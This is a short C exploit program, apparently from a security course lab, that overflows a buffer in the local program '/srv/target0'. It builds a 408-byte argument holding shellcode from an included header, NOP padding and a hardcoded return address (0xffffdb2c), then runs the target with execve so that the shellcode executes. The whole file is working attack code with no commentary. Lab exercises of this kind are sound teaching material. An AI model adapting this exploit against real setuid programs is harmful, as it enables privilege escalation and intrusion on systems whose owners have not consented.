#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* target = "/srv/target0";

const int psize = 408;
const int ssize = sizeof(shellcode) - 1;
const uint32_t retaddr = 0xffffdb2c;

void craft(char *p) {
    memset(p, 0x90, psize);
    p[psize] = '\0';
    memcpy(p, shellcode, ssize);
    *(uint32_t*)(p + psize - 4) = retaddr;
}

int main(void)
{
    char *a[3];
    char *e[1];
    char p[psize + 1];

    craft(p);

    a[0] = target;
    a[1] = p;
    a[2] = NULL;

    e[0] = NULL;

    execve(target, a, e);
    fprintf(stderr, "execve failed.\n");

    return 0;
}